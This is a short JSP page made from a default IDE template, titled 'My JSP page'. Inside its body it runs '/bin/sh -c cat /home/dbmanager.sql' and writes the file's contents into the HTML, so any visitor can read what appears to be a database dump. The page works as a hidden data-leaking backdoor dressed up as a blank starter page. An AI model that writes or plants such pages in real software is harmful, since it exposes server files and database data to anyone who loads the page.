<%@ page language="java" import="java.util.*, 
java.io.BufferedReader, java.io.InputStream,java.io.InputStreamReader" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
    <base href="<%=basePath%>">
    
    <title>My JSP 'MyJsp.jsp' starting page</title>
    
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">    
	<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
	<meta http-equiv="description" content="This is my page">

  </head>
  
  <body>
  <pre>
  <%
  	String[] cmds = {"/bin/sh","-c","cat /home/dbmanager.sql"};  
            Process pro = Runtime.getRuntime().exec(cmds);  
            pro.waitFor();  
            InputStream in = pro.getInputStream();  
            BufferedReader read = new BufferedReader(new InputStreamReader(in));  
            String line = null;  
            while((line = read.readLine())!=null)
            {%>            
               <%=line%>
            <%  }  %>
   </pre>
    This is my JSP page. <br>
  </body>
</html>

